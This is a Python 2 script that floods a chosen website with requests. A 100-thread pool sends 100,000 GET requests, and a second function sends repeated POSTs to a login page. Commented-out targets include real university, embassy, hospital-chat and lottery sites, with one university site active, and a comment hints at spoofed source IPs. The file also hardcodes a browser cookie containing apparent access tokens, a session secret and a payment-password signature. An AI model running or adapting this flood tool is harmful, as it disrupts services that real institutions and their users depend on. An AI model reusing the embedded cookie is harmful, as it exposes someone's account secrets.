__author__ = 'liugl'
import httplib
import urllib
from threadpool import ThreadPool
from threadpool import makeRequests
# from scapy import *
# from scapy.all import *
import random


def scapy_send():
    pass


def split_url(url):
    url_new = url.replace('http://', '').replace('https://', '')
    index1 = url_new.find('/')
    if index1 > 0:
        www = url_new[0:index1]
        request_url = url_new[index1:]
        return [www, request_url]
    else:
        return [url, '/']


def send_http(www, req):
    conn = httplib.HTTPConnection(www)
    conn.request("GET", req)
    re1 = conn.getresponse()
    print re1.status


def send_http_lottery(www, req):
    conn = httplib.HTTPConnection(www)
    cookie = '_lcas_uuid=223720485; _lcas_uuid=223720485; _lhc_uuid=sp_57850ecd81ece2.24662928; cookie_old_user_ad_time_2803225468=1; cookie_old_user_ad_num_2803225468=1; cookie_old_user_ad_2803225468=1; _lcas_uuid=223720485; _adwr=110406678%23http%253A%252F%252Ftrend.baidu.lecai.com%252Fssq%252F; LSID=sn86p6041c1qsnrjlaoil5ivu7; _adwp=110406678.5006763439.1468338246.1473152446.1473160629.4; _adwc=110406678; lehecai_request_control_stats=2; bds_yRlmiCbrv56CcjfMwS21DkqP=expires_in%3D2592000%26refresh_token%3D22.20952ff8fa9a7ed3260a9612f4e5b873.315360000.1788514951.742743018-106251%26access_token%3D21.d2f17babafa6c1a1df45000ebbe0af7d.2592000.1475746951.742743018-106251%26session_secret%3D78a73b4d2072dd61f89160ae7da157d9%26session_key%3D9mnRIBmE8Q%252FxQVSJ9zKP0ObkuNY1fEmGTJavnBZkvtQxTTQCZ37h6zm3vxz2t8qu3uYNodPTrqJRZ6IQDyf%252Bn3z6ZVyAjwA%253D%26scope%3Dbasic%2Bsuper_msg%26uid%3D742743018%26uname%3D186%252A%252A%252A%252A%252A348%26portrait%3D152c3541; _adwb=110406678; Hm_lvt_6c5523f20c6865769d31a32a219a6766=1473130088,1473130114; Hm_lpvt_6c5523f20c6865769d31a32a219a6766=1473160643; paypassword=sig%3D6ffedb764d3c8d543aa2aae69081e0d6%2Cuid%3D2803225468%2Cts%3D1473160642%2Cexpire%3D1200%2Cstatus%3D0%2Crc%3Dcd2a1aea4ee31c190ba551e2b5375d08; lehecai_request_control_userinfo=1; Hm_lvt_9b75c2b57524b5988823a3dd66ccc8ca=1473130088,1473130114; Hm_lpvt_9b75c2b57524b5988823a3dd66ccc8ca=1473160643'
    accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    accept_encoding = 'gzip, deflate, sdch'
    accept_language = 'zh-CN,zh;q=0.8'
    referer = 'http://baidu.lecai.com/lottery/draw/list/50'
    user_agent = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'
    conn.request("GET", req,
                 headers={'User-agent': user_agent, 'Accept': accept, 'Accept-encoding': accept_encoding,
                          'Accept-language': accept_language,
                          'Referer': referer, 'Cookie': cookie})

    re1 = conn.getresponse()
    print re1.status


def send_post(www, req, params):
    # params = urllib.urlencode({'name': 'tom', 'age': 22})
    headers = {"Content-type": "application/x-www-form-urlencoded"
        , "Accept": "text/plain"}

    httpClient = httplib.HTTPConnection(www, 80, timeout=30)
    httpClient.request("POST", req, params, headers)

    response = httpClient.getresponse()

    print response.status
    # print response.reason
    # print response.read()


def thread_pool_send_get(url):
    size = 100
    number = 100000
    www = split_url(url)[0]
    req = split_url(url)[1]
    pool = ThreadPool(size)
    requests = makeRequests(send_http, [([www, req], None) for i in range(number)])
    # requests = makeRequests(send_http_lottery, [([www, req], None) for i in range(number)])
    [pool.putRequest(req) for req in requests]
    pool.wait()


def thread_pool_send_post(url, param):
    size = 60
    number = 200
    www = split_url(url)[0]
    req = split_url(url)[1]
    pool = ThreadPool(size)
    requests = makeRequests(send_post, [([www, req, param], None) for i in range(number)])
    [pool.putRequest(req) for req in requests]
    pool.wait()


if __name__ == '__main__':
    from datetime import datetime

    d_begin = datetime.now()

    # request = IP(src=random.choice(SOURCE),dst=domain) / TCP(dport=80) / http


    # params = urllib.urlencode({'name': 'tom', 'age': 22})

    # url = 'http://www.stwx.com.cn/flash/top2.swf'
    # url = 'http://jt.bjhwgjyy.com/'
    # url = 'http://moon.bao.ac.cn/ceweb/datasrv/dmsce3.jsp'
    # url = 'http://111.207.26.12:9090/cas/login?service=http%3A%2F%2F111.207.26.13:9090%2Fc%2Fportal%2Flogin%3Fp_l_id%3D10182'
    # url = 'http://jsjxy.bistu.edu.cn/'
    # url = 'www.neuralstemcell.com.cn'
    # url = 'http://111.207.26.12:9090/uum/users_selfService!getSecretAnswerByUsername.action'
    # url = 'http://bjnkno1.sgxgn.org/yuanshouye/?sg09-pc-dyyy-mox423cf006636xom'
    # url = 'http://webservice.zoosnet.net/LR/Chatpre.aspx?id=LZA37747476&e=bjsgyyALink&r=bjnkno1.sgxgn.org&p=http%3A%2F%2Fbjnkno1.sgxgn.org%2Fyuanshouye%2F%3Fsg09-pc-dyyy-mox423cf006636xom&lng=cn&ud=%7B%22uid%22%3A+%221462460949943775%22%2C%22ver%22%3A+%221.0.2%22%7D&cid=1462461282999210453857&sid=1462461282999210453857&rf1=&rf2='
    url = 'http://www.bac.edu.cn/'
    # url = 'http://www.tlbaby.com/'
    # url = 'http://wt.zoosnet.net/LR/ChatWin2.aspx?lng=cn&p=http%3a%2f%2fwww.mary.net.cn%2f&rf1=https%3a%2f%2fwww.baidu&rf2=.com%2flink%3furl%3dHbvV7UenENRKoV2dkImdL0SkWtjMAeU9gxgMjupsvPtyo6-lyjvXXI5GtPyE2Jyd%26wd%3d%26eqid%3d835559ad000a728400000003572b65db&e=swt&bid=&d=1462462256388&id=LRW93818842&un=&ud=&cid=146249072666690248146&sid=146249072666690248146&skid1=&sk1=&un1=&ud1=&ex=swt&on='
    # url = 'http://swtkq.wz120.cc/LR/chat.aspx?from=LXM27838488'
    # url = 'http://pct.zoosnet.net/LR/ChatWin2.aspx?lng=cn&p=http%3a%2f%2fwww.tjhsfk.com%2f&rf1=https%3a%2f%2fwww.baidu&rf2=.com%2flink%3furl%3d4p3ojkzn-Ff5ViFq2yEej76uYxXYbxgyJVjnouOdzPi%26wd%3d%26eqid%3d9e513c00000c74d900000003572b6835&e=%E5%A5%B3%E6%80%A7%E4%B8%8D%E5%AD%95%E5%B8%B8%E8%AF%86%E4%BA%BA%E6%B5%81%E8%AE%A1%E7%94%9F%3Cli%3E%E5%A6%87%E7%A7%91%E7%82%8E%E7%97%87%3Cli%3E%E5%A6%87%E7%A7%91%E6%95%B4%E5%BD%A2%3Cli%3E%E5%AD%90%E5%AE%AB%E8%82%8C%E7%98%A4%3Cli%3E%E5%8D%B5%E5%B7%A2%E5%9B%8A%E8%82%BF%3Cli%3E%E4%B8%8D%E5%AD%95%E4%B8%8D%E8%82%B2%3Cli%3E%E7%97%87%E7%8A%B6%E5%92%A8%E8%AF%A2%3Cli%3E%E7%94%B7%E7%A7%91%E5%92%A8%E8%AF%A2%3Cli%3E%E5%81%A5%E5%BA%B7%E4%BD%93%E6%A3%80%3Cli%3E&bid=&d=1462462972104&id=PCT77150827&un=&ud=&cid=1462462863146786600463&sid=1462462863146786600463&skid1=&sk1=&un1=&ud1=&ex=%E5%A5%B3%E6%80%A7%E4%B8%8D%E5%AD%95%E5%B8%B8%E8%AF%86&on='
    # url = 'http://boai.zoossoft.com/LR/Chatpre.aspx?id=LCE43787019&cid=1462463764457472057179&lng=cn&sid=1462463764457472057179&p=http%3A//www.sg91.cn/&rf1=https%3A//www.baidu&rf2=.com/link%3Furl%3DogHYz1AI48yfdVRa0nYYeV1OljcaymOR1X7xl22h-KK%26wd%3D%26eqid%3Ddc303f7d000c90a100000003572b6bc3&bid=&d=1462463771007'
    # url = 'http://www.philembassychina.org/'
    # url = 'http://beijingpe.dfa.gov.ph/'
    # url = 'http://119.90.25.35/pl3.live.panda.tv/live_panda/0592a6cc9d86bc9afa4072a0e6c96023.flv'
    # url = 'http://baidu.lecai.com/lottery/draw/phase_result_download.php?file_format=txt&lottery_type=50&year=2012'
    # url = 'http://www.cau.edu.cn/'
    thread_pool_send_get(url)

    # url = 'http://jsjxy.bistu.edu.cn/manager'
    # param = "userName=admin&password=xxx&button=%E6%8F%90%E4%BA%A4"
    # thread_pool_send_post(url, param)

    d_end = datetime.now()
    print str((d_end - d_begin).seconds)
    pass
